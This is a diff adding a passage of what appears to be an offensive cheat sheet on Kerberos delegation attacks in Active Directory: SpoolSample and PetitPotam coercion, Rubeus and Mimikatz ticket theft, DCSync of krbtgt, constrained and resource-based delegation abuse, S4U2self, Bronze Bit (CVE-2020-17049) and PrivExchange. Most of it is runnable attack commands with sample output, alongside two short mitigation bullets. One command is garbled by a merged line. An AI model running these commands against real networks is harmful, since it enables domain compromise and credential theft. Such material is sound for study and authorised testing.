@@ -1,0 +1,214 @@
+>  SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.
+```powershell
+# From https://github.com/leechristensen/SpoolSample
+.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
+.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
+# DC01.HACKER.LAB is the domain controller we want to compromise
+# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.
+# From https://github.com/dirkjanm/krbrelayx
+printerbug.py 'domain/username:password'@ 
+# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
+python dementor.py -d domain -u username -p password  
+```
+If the attack worked you should get a TGT of the domain controller.
+#### Load the ticket
+Extract the base64 TGT from Rubeus output and load it to our current session.
+```powershell
+.\Rubeus.exe asktgs /ticket: /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
+```
+Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`
+Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`
+#### Mitigation
+* Ensure sensitive accounts cannot be delegated
+* Disable the Print Spooler Service
+### MS-EFSRPC Abuse with Unconstrained Delegation
+Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.
+```bash
+# Coerce the callback
+git clone https://github.com/topotam/PetitPotam
+python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
+python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
+# Extract the ticket
+.\Rubeus.exe asktgs /ticket: /ptt
+```
+## Kerberos Constrained Delegation
+> Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.
+### Identify a Constrained Delegation
+* BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`
+* PowerView: `Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`
+* Native
+  ```powershell
+  Get-DomainComputer -TrustedToAuth | select -exp dnshostname
+  Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
+  ```
+### Exploit the Constrained Delegation
+* Impacket
+  ```ps1
+  getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+  ```
+* Rubeus: S4U2 attack (S4U2self + S4U2proxy)
+  ```ps1
+  # with a password
+  Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
+  # with a NT hash
+  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
+  Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
+  dir \\dc.domain.com\c$
+  ```
+* Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the "Administrator"
+  ```ps1
+  # Dump ticket
+  Rubeus.exe tgtdeleg /nowrap
+  Rubeus.exe triage
+  Rubeus.exe dump /luid:0x12d1f7
+  # Create a ticket
+  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
+  ```
+* Rubeus : using aes256 keys
+  ```ps1
+  # Get aes256 keys of the machine account
+  privilege::debug
+  token::elevate
+  sekurlsa::ekeys
+  # Create a ticket
+  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
+  ```
+### Impersonate a domain user on a resource
+Require:
+* SYSTEM level privileges on a machine configured with constrained delegation
+```ps1
+PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
+PS> $idToImpersonate.Impersonate()
+PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+PS> ls \\dc01.offense.local\c$
+```
+## Kerberos Resource Based Constrained Delegation
+Resource-based Constrained Delegation was introduced in Windows Server 2012. 
+> The user sends a Service Ticket (ST) to access the service ("Service A"), and if the service is allowed to delegate to another pre-defined service ("Service B"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+1. Import **Powermad** and **Powerview**
+    ```powershell
+    PowerShell.exe -ExecutionPolicy Bypass
+    Import-Module .\powermad.ps1
+    Import-Module .\powerview.ps1
+    ```
+2. Get user SID
+    ```powershell
+    $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
+    $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
+    $ACE
+    ConvertFrom-SID $ACE.SecurityIdentifier
+    ```
+3. Abuse **MachineAccountQuota** to create a computer account and set an SPN for it
+    ```powershell
+    New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)
+    ```
+4. Rewrite DC's **AllowedToActOnBehalfOfOtherIdentity** properties
+    ```powershell
+    $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+    $SD.GetBinaryForm($SDBytes, 0)
+    Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+    $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+    $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+    $Descriptor.DiscretionaryAcl
+    ```
+    ```ps1
+    # alternative
+    $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+    # alternative
+    StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND
+    ```
+5. Use Rubeus to get hash from password
+    ```powershell
+    Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan
+    [*] Input password             : Weakest123*
+    [*] Input username             : swktest$
+    [*] Input domain               : factory.lan
+    [*] Salt                       : FACTORY.LANswktest
+    [*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
+    [*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498
+    [*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
+    [*]       des_cbc_md5          : BA297CFD07E62A5E
+    ```
+6. Impersonate domain admin using our newly created machine account
+    ```powershell
+    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
+    .\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
+    [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
+    [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
+    [*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'
+    [*] Sending S4U2proxy request
+    [+] S4U2proxy success!
+    [*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':
+        doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
+        AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
+        LmZhY3RvcnkubGFu
+    [*] Action: Import Ticket
+    [+] Ticket successfully imported!
+    ```
+## Kerberos Service for User Extension
+* Service For User To Self which allows a service to obtain a TGS on behalf of another user
+* Service For User To Proxy which allows a service to obtain a TGS on behalf of another user on another service
+### S4U2self - Privilege Escalation
+1. Get a TGT 
+    * Using Unconstrained Delegation
+    * Using the current machine account: `Rubeus.exe tgtdeleg /nowrap`
+2. Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.
+    ```ps1
+    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
+    Rubeus.exe ptt /ticket:"base64ticket"
+    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
+    ```
+The "Network Service" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself.
+```ps1
+# The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.
+Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
+# The service name is not included in the TGS ciphered data and can be modified at will.
+Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
+```
+## Kerberos Bronze Bit Attack - CVE-2020-17049
+> An attacker can impersonate users which are not allowed to be delegated. This includes members of the **Protected Users** group and any other users explicitly configured as **sensitive and cannot be delegated**.
+> Patch is out on November 10, 2020, DC are most likely vulnerable until [February 2021](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049).
+:warning: Patched Error Message : `[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)`
+Requirements:
+* Service account's password hash 
+* Service account's with `Constrained Delegation` or `Resource Based Constrained Delegation`
+* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013) 
+**Attack #1** - Bypass the `Trust this user for delegation to specified services only – Use Kerberos only` protection and impersonate a user who is protected from delegation.
+```powershell
+# forwardable flag is only protected by the ticket encryption which uses the service account's password 
+$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes  -aesKey  test.local/Service1 -force-forwardable -dc-ip  # -> Forwardable
+$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable
+# Load the ticket
+.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit
+# Access "c$"
+ls \\service2.test.local\c$
+```
+**Attack #2** - Write Permissions to one or more objects in the AD
+```powershell
+# Create a new machine account
+Import-Module .\Powermad\powermad.ps1
+New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
+.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
+# Set PrincipalsAllowedToDelegateToAccount
+Install-WindowsFeature RSAT-AD-PowerShell
+Import-Module ActiveDirectory
+Get-ADComputer AttackerService
+Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
+Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
+# Execute the attack
+python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
+# Load the ticket
+.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
+```
+## PrivExchange attack
+Exchange your privileges for Domain Admin privs by abusing Exchange.    
+:warning: You need a shell on a user account with a mailbox.
+1. Exchange server hostname or IP address
+    ```bash 
+    pth-net rpc group members "Exchange Servers" -I dc01.domain.local -U domain/username
+    ```
+2. Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).
